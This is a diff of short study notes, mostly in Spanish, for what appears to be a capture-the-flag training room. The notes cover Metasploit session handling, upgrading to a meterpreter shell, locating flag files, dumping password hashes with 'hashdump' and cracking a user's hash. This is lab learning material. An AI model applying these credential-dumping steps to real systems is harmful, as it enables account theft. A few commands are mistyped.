@@ -34,6 +34,8 @@ session -l --para ver las sesiones
 
 session -u <sesion> --para hacerla meterpreter 
 
+session -1 id session --para entrar a la session meterpreter
+
 Flag1? This flag can be found at the system root. 
   cd .. --hasta llegar a C:\
   type-cat flag1.txt
@@ -47,5 +49,10 @@ flag3? This flag can be found in an excellent location to loot. After all, Admin
   cd Users y ya buscas la carpeta correcta
   cat flag3.txt
 
+Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
+  hasdump para encontrar a Jon
+
+Copy this password hash to a file and research how to crack it. What is the cracked password?
+  usar el decode de hash para saber la contrasenya
 
   
